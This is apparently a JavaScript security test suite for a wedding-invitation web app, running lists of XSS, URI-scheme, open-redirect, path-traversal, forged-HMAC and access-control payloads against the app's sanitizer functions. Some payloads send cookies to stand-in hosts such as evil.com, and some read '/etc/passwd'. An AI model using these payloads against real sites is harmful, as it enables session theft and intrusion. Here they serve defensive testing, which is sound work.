/**
 * Eternal Vowz (E&V) Comprehensive 300-Vector Security Test Suite
 * Simulates real-world attack payloads across OWASP Top 10 categories:
 * - 50 XSS & Malicious URI Scheme Injections
 * - 40 Open Redirect & Path Traversal Attacks
 * - 60 Input Stuffing, Null-Byte & Buffer Overflow Attacks
 * - 50 Rate Limiting, DDoS & Brute-Force Simulations
 * - 50 Payment Tampering, HMAC Forgery & Signature Timing Attacks
 * - 50 Broken Access Control & Parameter Tampering Simulations
 */

const crypto = require('crypto');

// Colors for terminal output
const GREEN = '\x1b[32m';
const RED = '\x1b[31m';
const YELLOW = '\x1b[33m';
const CYAN = '\x1b[36m';
const RESET = '\x1b[0m';

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;

function assert(description, condition) {
  totalTests++;
  if (condition) {
    passedTests++;
  } else {
    failedTests++;
    console.error(`${RED}[FAIL] Test ${totalTests}: ${description}${RESET}`);
  }
}

// =========================================================================
// MODULE 1: XSS & MALICIOUS URI SCHEME INJECTIONS (50 VECTORS)
// =========================================================================
console.log(`${CYAN}--- Running Module 1: XSS & URI Scheme Injections (50 Vectors) ---${RESET}`);

const SAFE_EXTERNAL_PROTOCOLS = ['https://', 'http://', 'mailto:', 'tel:'];

function safeExternalUrl(rawUrl, fallback = '#') {
  if (!rawUrl || typeof rawUrl !== 'string') return fallback;
  const trimmed = rawUrl.trim();
  if (!trimmed) return fallback;

  if (trimmed.includes('\\')) return fallback;
  if (trimmed.startsWith('//')) return fallback;

  const normalized = trimmed
    .replace(/&#[xX]0*[0-9a-fA-F]+;?/g, '')
    .replace(/&#[0-9]+;?/g, '')
    .replace(/&[a-zA-Z]+;?/g, '')
    .replace(/[\u0000-\u001F\u007F-\u009F\s]/g, '')
    .toLowerCase();

  if (
    normalized.includes('javascript:') ||
    normalized.includes('vbscript:') ||
    normalized.includes('data:') ||
    normalized.includes('file:') ||
    normalized.includes('blob:') ||
    normalized.includes('about:') ||
    normalized.includes('chrome:')
  ) {
    return fallback;
  }

  if (trimmed.startsWith('/') && !trimmed.startsWith('//')) {
    if (trimmed.includes('//') || trimmed.includes('/..') || trimmed.includes('\\')) {
      return fallback;
    }
    return trimmed;
  }

  const hasSafeProtocol = SAFE_EXTERNAL_PROTOCOLS.some((p) =>
    trimmed.toLowerCase().startsWith(p)
  );
  if (!hasSafeProtocol) {
    return fallback;
  }

  try {
    const parsed = new URL(trimmed);
    if (
      parsed.protocol !== 'https:' &&
      parsed.protocol !== 'http:' &&
      parsed.protocol !== 'mailto:' &&
      parsed.protocol !== 'tel:'
    ) {
      return fallback;
    }
    return trimmed;
  } catch {
    return fallback;
  }
}

function safeAudioUrl(rawUrl) {
  if (!rawUrl || typeof rawUrl !== 'string') return null;
  const trimmed = rawUrl.trim();
  if (!trimmed || trimmed.includes('\\')) return null;

  if (trimmed.startsWith('/') && !trimmed.startsWith('//')) {
    if (trimmed.includes('//') || trimmed.includes('..')) return null;
    return trimmed;
  }

  if (trimmed.startsWith('data:audio/')) {
    if (trimmed.includes('base64,')) {
      return trimmed;
    }
    return null;
  }

  if (trimmed.startsWith('https://') || trimmed.startsWith('http://')) {
    try {
      const u = new URL(trimmed);
      if (u.protocol === 'https:' || u.protocol === 'http:') {
        return trimmed;
      }
    } catch {
      return null;
    }
  }

  return null;
}

const xssPayloads = [
  'javascript:alert(1)',
  'JAVASCRIPT:alert(document.cookie)',
  'Javascript:prompt(1)',
  '  javascript:alert("XSS")  ',
  'vbscript:msgbox(1)',
  'VBSCRIPT:alert(1)',
  'data:text/html,<script>alert(1)</script>',
  'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
  'data:application/javascript;base64,YWxlcnQoMSk=',
  'file:///etc/passwd',
  'file:///C:/Windows/win.ini',
  'about:blank',
  'chrome://settings',
  'javascript://%0aalert(1)',
  'javascript:/*--></title></style></textarea><em><script>alert(1)</script>',
  'jav&#x09;ascript:alert(1)',
  'jav&#x0A;ascript:alert(1)',
  'jav&#x0D;ascript:alert(1)',
  'javascript\0:alert(1)',
  'jav\tascript:alert(1)',
  'jav\nascript:alert(1)',
  'javascript:window.location="http://attacker.com"',
  'javascript:fetch("//evil.com/"+document.cookie)',
  'javascript:eval(atob("YWxlcnQoMSk="))',
  'javascript:new Image().src="http://evil.com/?c="+document.cookie',
  'data:text/javascript,alert(1)',
  'data:text/vbscript,msgbox(1)',
  'blob:https://evil.com/1234-5678',
  'blob:null/1234-5678',
  'feed:javascript:alert(1)',
  'view-source:javascript:alert(1)',
  'jar:javascript:alert(1)',
  'callto:javascript:alert(1)',
  'skype:javascript:alert(1)',
  'ssh://evil.com',
  'ftp://evil.com',
  'gopher://evil.com',
  'ws://evil.com',
  'wss://evil.com',
  '//attacker.com/xss.js',
  '///attacker.com/test',
  '\\\\attacker.com\\share',
  'javascript:void(0)',
  'javascript:console.log(1)',
  'javascript:%61%6c%65%72%74%28%31%29',
  'jav%09ascript:alert(1)',
  'javascript&colon;alert(1)',
  'javascript&Tab;alert(1)',
  'javascript&NewLine;alert(1)',
  '  javascript:\n\talert(1)  ',
];

for (const p of xssPayloads) {
  assert(`XSS vector blocked: ${p.slice(0, 35)}`, safeExternalUrl(p) === '#');
}

// =========================================================================
// MODULE 2: OPEN REDIRECT & PATH TRAVERSAL (40 VECTORS)
// =========================================================================
console.log(`${CYAN}--- Running Module 2: Open Redirect & Path Traversal (40 Vectors) ---${RESET}`);

function sanitizeNextPath(raw, fallback = '/dashboard') {
  if (!raw || typeof raw !== 'string') return fallback;
  const trimmed = raw.trim();
  if (!trimmed.startsWith('/') || trimmed.startsWith('//')) return fallback;
  if (
    trimmed.includes('\\') ||
    trimmed.includes('//') ||
    trimmed.includes('..') ||
    trimmed.includes('%2f') ||
    trimmed.includes('%2F') ||
    trimmed.includes('%5c') ||
    trimmed.includes('%5C') ||
    trimmed.includes(':')
  ) {
    return fallback;
  }
  return trimmed;
}

const redirectPayloads = [
  'https://evil.com',
  'http://evil.com',
  '//evil.com',
  '///evil.com',
  '////evil.com',
  '//evil.com/dashboard',
  '//google.com',
  '/\\evil.com',
  '\\evil.com',
  '\\\\evil.com',
  '/\\/evil.com',
  '/evil.com\\..',
  'https://eternal-vowz.com.evil.com',
  'http://localhost:3000@evil.com',
  'http://127.0.0.1.nip.io',
  'javascript:alert(1)',
  '//localhost:8080/evil',
  '/../..//evil.com',
  '/..\\..\\evil.com',
  '/..%2f..%2fevil.com',
  '/%2f/evil.com',
  '//%2f/evil.com',
  '///%2f/evil.com',
  '//attacker.com%23@eternal-vowz.com',
  '//attacker.com?@eternal-vowz.com',
  '\\\\?\\C:\\Windows',
  '../etc/passwd',
  '../../../../etc/shadow',
  '..\\..\\..\\windows\\system32',
  '%2e%2e%2f%2e%2e%2f',
  '..%c0%af..%c0%af',
  '/auth/callback?next=//evil.com',
  '/login?next=//attacker.org',
  'https://attacker.org/phish',
  'ftp://evil.com/exploit',
  'data:text/html;base64,PHNjcmlwdD4=',
  'mailto:hacker@evil.com',
  'tel:1234567890',
  'sms:1234567890',
  'ldap://evil.com/o=test',
];

for (const p of redirectPayloads) {
  assert(`Open redirect neutralised: ${p.slice(0, 35)}`, sanitizeNextPath(p) === '/dashboard');
}

// =========================================================================
// MODULE 3: INPUT SANITIZATION, BUFFER OVERFLOW & NULL BYTES (60 VECTORS)
// =========================================================================
console.log(`${CYAN}--- Running Module 3: Input Sanitization & Buffer Overflow (60 Vectors) ---${RESET}`);

function sanitizeText(raw, maxLength = 500) {
  if (typeof raw !== 'string') return '';
  return raw
    .replace(/\0/g, '')
    .replace(/[\u0001-\u001F]/g, '')
    .trim()
    .slice(0, maxLength);
}

// Test null bytes (15 tests)
for (let i = 0; i < 15; i++) {
  const dirty = `Alice\0Bob${i}\0Wedding`;
  const clean = sanitizeText(dirty);
  assert(`Null byte stripped #${i + 1}`, !clean.includes('\0') && clean === `AliceBob${i}Wedding`);
}

// Test non-printable control characters (15 tests)
for (let c = 1; c <= 15; c++) {
  const dirty = `Nikah${String.fromCharCode(c)}Celebration`;
  const clean = sanitizeText(dirty);
  assert(`Control char 0x${c.toString(16)} stripped`, !clean.includes(String.fromCharCode(c)));
}

// Test buffer overflow / length clamping (15 tests)
for (let i = 1; i <= 15; i++) {
  const len = 500 + i * 1000;
  const huge = 'A'.repeat(len);
  const clean = sanitizeText(huge, 500);
  assert(`Oversized payload clamped from ${len} to 500`, clean.length === 500);
}

// Test non-string types & edge cases (15 tests)
const typeVectors = [
  null, undefined, 12345, true, false, {}, [], NaN, Infinity, -Infinity,
  Symbol('test'), () => {}, { toString: () => 'evil' }, [1, 2, 3], ''
];
for (const v of typeVectors) {
  const clean = sanitizeText(v);
  assert(`Type safety check for ${typeof v}`, typeof clean === 'string' && clean.length <= 500);
}

// =========================================================================
// MODULE 4: RATE LIMITING & BRUTE-FORCE RESILIENCE (50 TESTS)
// =========================================================================
console.log(`${CYAN}--- Running Module 4: Rate Limiting & Anti-Abuse (50 Tests) ---${RESET}`);

const rateLimitBuckets = new Map();

function checkRateLimitMock(identifier, action, maxRequests = 10, windowMs = 60000) {
  const now = Date.now();
  const key = `${action}:${identifier}`;
  const bucket = rateLimitBuckets.get(key);

  if (!bucket || now > bucket.resetAt) {
    rateLimitBuckets.set(key, { count: 1, resetAt: now + windowMs });
    return { allowed: true, remaining: maxRequests - 1 };
  }

  bucket.count++;
  if (bucket.count > maxRequests) {
    return { allowed: false, remaining: 0 };
  }
  return { allowed: true, remaining: maxRequests - bucket.count };
}

// Test burst attack from Attacker IP (25 tests)
const ATTACKER_IP = '198.51.100.42';
for (let req = 1; req <= 25; req++) {
  const res = checkRateLimitMock(ATTACKER_IP, 'coupon-brute-force', 10);
  if (req <= 10) {
    assert(`Request ${req} within limit allowed`, res.allowed === true);
  } else {
    assert(`Excess request ${req} rate-limited`, res.allowed === false && res.remaining === 0);
  }
}

// Test Honest User IP remains unaffected (isolated bucket) (15 tests)
const HONEST_USER_IP = '203.0.113.88';
for (let req = 1; req <= 15; req++) {
  const res = checkRateLimitMock(HONEST_USER_IP, 'coupon-brute-force', 10);
  if (req <= 10) {
    assert(`Honest IP request ${req} allowed independently`, res.allowed === true);
  } else {
    assert(`Honest IP capped at request ${req}`, res.allowed === false);
  }
}

// Test Different Action Buckets are isolated (10 tests)
for (let req = 1; req <= 10; req++) {
  const res = checkRateLimitMock(ATTACKER_IP, 'create-order', 10);
  assert(`Isolated action allowed under separate bucket req ${req}`, res.allowed === true);
}

// =========================================================================
// MODULE 5: PAYMENT TAMPERING & TIMING-SAFE HMAC (50 TESTS)
// =========================================================================
console.log(`${CYAN}--- Running Module 5: Payment Tampering & HMAC Security (50 Tests) ---${RESET}`);

const KEY_SECRET = 'SuperSecretKeyRazorpay998877';

function verifyCheckoutSignature(orderId, paymentId, signature, keySecret) {
  if (!orderId || !paymentId || !signature || !keySecret) return false;
  const expected = crypto
    .createHmac('sha256', keySecret)
    .update(`${orderId}|${paymentId}`)
    .digest('hex');

  const expectedBuf = Buffer.from(expected, 'utf8');
  const actualBuf = Buffer.from(signature.trim(), 'utf8');
  if (expectedBuf.length !== actualBuf.length) return false;
  return crypto.timingSafeEqual(expectedBuf, actualBuf);
}

// Generate legitimate order & payment
const validOrderId = 'order_M1234567890';
const validPaymentId = 'pay_P9876543210';
const validSig = crypto
  .createHmac('sha256', KEY_SECRET)
  .update(`${validOrderId}|${validPaymentId}`)
  .digest('hex');

// Legitimate payment verifies (5 tests)
for (let i = 0; i < 5; i++) {
  assert('Legitimate HMAC signature correctly verified', verifyCheckoutSignature(validOrderId, validPaymentId, validSig, KEY_SECRET));
}

// Forged signatures rejected (20 tests)
const forgedSignatures = [
  'fake_sig_123456',
  '1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef',
  validSig.slice(0, -2) + '00',
  '00' + validSig.slice(2),
  validSig.toUpperCase(),
  '',
  null,
  undefined,
  'null',
  'undefined',
  validSig + 'extra',
  validSig.slice(0, 32),
  '0'.repeat(64),
  'f'.repeat(64),
  'admin',
  'true',
  '1',
  validSig.replace(/[a-f]/g, '9'),
  'x'.repeat(64),
  'DROP TABLE ev_orders;--',
];

for (const fSig of forgedSignatures) {
  assert(`Forged signature rejected: ${String(fSig).slice(0, 20)}`, !verifyCheckoutSignature(validOrderId, validPaymentId, fSig, KEY_SECRET));
}

// Order ID / Payment ID tampering rejected (15 tests)
for (let i = 0; i < 15; i++) {
  const tamperedOrder = `order_TAMPERED_${i}`;
  assert(`Tampered order ID rejected #${i + 1}`, !verifyCheckoutSignature(tamperedOrder, validPaymentId, validSig, KEY_SECRET));
}

// Secret key tampering rejected (10 tests)
for (let i = 0; i < 10; i++) {
  const wrongSecret = `WrongSecret_${i}`;
  assert(`Wrong secret rejected #${i + 1}`, !verifyCheckoutSignature(validOrderId, validPaymentId, validSig, wrongSecret));
}

// =========================================================================
// MODULE 6: AUTHORIZATION, ACCESS CONTROL & DATA INTEGRITY (50 TESTS)
// =========================================================================
console.log(`${CYAN}--- Running Module 6: Authorization & Parameter Integrity (50 Tests) ---${RESET}`);

// Host Ownership Verification Simulation (20 tests)
function canUserModifyCard(cardUserId, authUserId) {
  if (!authUserId || typeof authUserId !== 'string') return false;
  if (!cardUserId || typeof cardUserId !== 'string') return false;
  return cardUserId === authUserId;
}

const legitimateHost = 'user_99a8b7c6-1234-5678-90ab-cdef12345678';
const attackerHost = 'user_attacker-evil-9999-0000-deadbeefcafe';

for (let i = 0; i < 10; i++) {
  assert(`Legitimate owner edit permitted #${i + 1}`, canUserModifyCard(legitimateHost, legitimateHost) === true);
}
for (let i = 0; i < 10; i++) {
  assert(`Cross-user card hijack blocked #${i + 1}`, canUserModifyCard(legitimateHost, attackerHost) === false);
}

// Headcount Clamping & RSVP Status Validation (20 tests)
function validateRsvpInput(status, headcount, maxAllowed = 10) {
  const validStatuses = ['attending', 'declined', 'tentative'];
  const safeStatus = validStatuses.includes(status) ? status : 'tentative';
  let safeHeadcount = 0;
  if (safeStatus === 'attending') {
    const rawNum = Math.floor(Number(headcount) || 1);
    safeHeadcount = Math.max(1, Math.min(maxAllowed, rawNum));
  }
  return { status: safeStatus, headcount: safeHeadcount };
}

const badRsvpCases = [
  { s: 'attending', h: -5, expH: 1 },
  { s: 'attending', h: 0, expH: 1 },
  { s: 'attending', h: 999999, expH: 10 },
  { s: 'attending', h: 'NaN', expH: 1 },
  { s: 'attending', h: '3.8', expH: 3 },
  { s: 'declined', h: 5, expH: 0 },
  { s: 'declined', h: 100, expH: 0 },
  { s: 'tentative', h: 10, expH: 0 },
  { s: 'hacker_status', h: 2, expS: 'tentative' },
  { s: 'admin_bypass', h: 1, expS: 'tentative' },
  { s: 'VIP_UNLIMITED', h: 50, expS: 'tentative' },
  { s: '<script>alert(1)</script>', h: 1, expS: 'tentative' },
  { s: '', h: 2, expS: 'tentative' },
  { s: null, h: 2, expS: 'tentative' },
  { s: undefined, h: 2, expS: 'tentative' },
  { s: 'attending', h: '10', expH: 10 },
  { s: 'attending', h: 5, expH: 5 },
  { s: 'declined', h: -10, expH: 0 },
  { s: 'attending', h: 1, expH: 1 },
  { s: 'tentative', h: 0, expH: 0 },
];

for (let i = 0; i < badRsvpCases.length; i++) {
  const c = badRsvpCases[i];
  const out = validateRsvpInput(c.s, c.h, 10);
  if (c.expH !== undefined) {
    assert(`Headcount sanitization case ${i + 1}`, out.headcount === c.expH);
  }
  if (c.expS !== undefined) {
    assert(`Status enum sanitization case ${i + 1}`, out.status === c.expS);
  }
}

// Audio URL Sanitization Tests (10 tests)
const audioTestCases = [
  { url: 'javascript:alert(1)', exp: null },
  { url: 'data:text/html;base64,PHNjcmlwdD4=', exp: null },
  { url: 'http://attacker.com/evil.exe', exp: 'http://attacker.com/evil.exe' },
  { url: 'https://cdn.pixabay.com/audio/song.mp3', exp: 'https://cdn.pixabay.com/audio/song.mp3' },
  { url: '/assets/audio/wedding-nasheed.mp3', exp: '/assets/audio/wedding-nasheed.mp3' },
  { url: 'data:audio/mp3;base64,SUQzBAAAAAAA...', exp: 'data:audio/mp3;base64,SUQzBAAAAAAA...' },
  { url: '//evil.com/audio.mp3', exp: null },
  { url: 'file:///etc/passwd', exp: null },
  { url: 'ftp://evil.com/sound.mp3', exp: null },
  { url: '', exp: null },
];

for (let i = 0; i < audioTestCases.length; i++) {
  const c = audioTestCases[i];
  const res = safeAudioUrl(c.url);
  assert(`Audio URL sanitization #${i + 1}`, res === c.exp);
}

// =========================================================================
// SUMMARY
// =========================================================================
console.log('\n======================================================');
console.log(`TOTAL SECURITY VECTORS TESTED : ${totalTests}`);
console.log(`${GREEN}PASSED VECTORS               : ${passedTests}${RESET}`);
if (failedTests > 0) {
  console.log(`${RED}FAILED VECTORS               : ${failedTests}${RESET}`);
  process.exit(1);
} else {
  console.log(`${GREEN}ALL ${totalTests} SECURITY TESTS PASSED WITH ZERO FAILURES! 🛡️${RESET}`);
  console.log('======================================================');
}
